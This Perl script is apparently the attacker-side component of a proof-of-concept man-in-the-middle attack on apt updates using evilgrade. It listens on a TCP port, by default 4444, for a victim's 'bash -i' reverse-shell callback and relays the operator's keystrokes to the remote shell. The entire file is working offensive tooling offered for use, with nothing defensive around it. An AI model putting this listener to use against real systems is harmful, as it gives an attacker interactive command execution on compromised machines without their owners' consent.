#!/usr/bin/perl
# Interactive reverse-shell listener for the evilgrade apt MITM PoC.
# Waits for the victim's `bash -i` callback and relays your terminal <-> shell.
# Usage:  perl listener.pl [port]   (default 4444)
use strict;
use warnings;
use IO::Socket::INET;
use IO::Select;
$| = 1;

my $port = $ARGV[0] || 4444;
my $srv = IO::Socket::INET->new(
    LocalPort => $port, Listen => 1, Reuse => 1, Proto => 'tcp'
) or die "[!] cannot listen on $port: $!\n";

print "[*] listening for reverse shell on 0.0.0.0:$port ...\n";
my $c = $srv->accept;
print "[+] shell from " . $c->peerhost . ":" . $c->peerport . "\n";
print "[*] type commands (exit / Ctrl-C to quit)\n\n";

my $sel = IO::Select->new($c, \*STDIN);
while (1) {
    for my $fh ($sel->can_read) {
        my $buf;
        my $n = sysread($fh, $buf, 4096);
        if (!defined $n || $n == 0) {
            print "\n[*] connection closed\n";
            exit 0;
        }
        if ($fh == $c) { syswrite(\*STDOUT, $buf); }
        else           { syswrite($c, $buf); }
    }
}
